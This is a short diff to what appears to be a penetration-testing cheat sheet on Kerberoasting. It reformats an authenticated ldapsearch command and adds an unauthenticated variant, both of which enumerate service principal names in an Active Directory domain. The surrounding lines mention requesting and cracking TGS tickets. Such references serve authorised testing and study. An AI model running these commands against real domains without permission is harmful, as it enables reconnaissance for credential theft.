@@ -74,9 +74,14 @@ impacket-GetUserSPNs DOMAIN/username:password -dc-ip target.com -request -output
 
 #### Enumerate SPNs via LDAP with credentials (alternative)
 ```
-ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w password \
-  -b "DC=example,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w password -b "DC=example,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
 ```
+
+#### Enumerate SPNs via LDAP with NO credentials (alternative)
+```
+ldapsearch -x -H ldap://<DC_IP> -b "DC=example,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+```
+
 
 ### Crack Kerberos Tickets (TGS)
 
